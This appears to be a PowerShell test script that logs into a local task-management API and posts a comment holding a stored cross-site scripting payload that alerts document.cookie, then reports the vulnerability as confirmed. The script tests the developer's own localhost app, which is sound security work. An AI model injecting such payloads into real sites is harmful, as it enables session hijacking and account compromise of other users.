# Simple XSS Test Script
Write-Host "🚨 Testing XSS Vulnerability" -ForegroundColor Red

# Test if server is running
try {
    $response = Invoke-WebRequest -Uri "http://localhost:3001/api/auth/login" -Method Post -Body '{"email":"alice@example.com","password":"password123"}' -ContentType "application/json" -UseBasicParsing
    $loginData = $response.Content | ConvertFrom-Json
    $token = $loginData.token
    Write-Host "✅ Login successful" -ForegroundColor Green
    
    # Get tasks
    $headers = @{ "Authorization" = "Bearer $token" }
    $tasksResponse = Invoke-WebRequest -Uri "http://localhost:3001/api/tasks" -Headers $headers -UseBasicParsing
    $tasks = $tasksResponse.Content | ConvertFrom-Json
    
    if ($tasks.Count -gt 0) {
        $taskId = $tasks[0].id
        Write-Host "📋 Using task ID: $taskId" -ForegroundColor Cyan
        
        # Test XSS payload
        $xssPayload = "<img src=x onerror='alert(document.cookie)'>"
        $commentBody = @{ content = $xssPayload } | ConvertTo-Json
        
        $commentResponse = Invoke-WebRequest -Uri "http://localhost:3001/api/comments/task/$taskId" -Method Post -Body $commentBody -Headers $headers -ContentType "application/json" -UseBasicParsing
        
        if ($commentResponse.StatusCode -eq 201) {
            Write-Host "🚨 XSS VULNERABILITY CONFIRMED!" -ForegroundColor Red
            Write-Host "   Payload stored: $xssPayload" -ForegroundColor Yellow
            Write-Host "   View at: http://localhost:3000/tasks/$taskId" -ForegroundColor Cyan
            Write-Host "   The alert will execute when you view the task!" -ForegroundColor Red
        }
    }
}
catch {
    Write-Host "❌ Test failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "   Make sure the server is running on localhost:3001" -ForegroundColor Yellow
}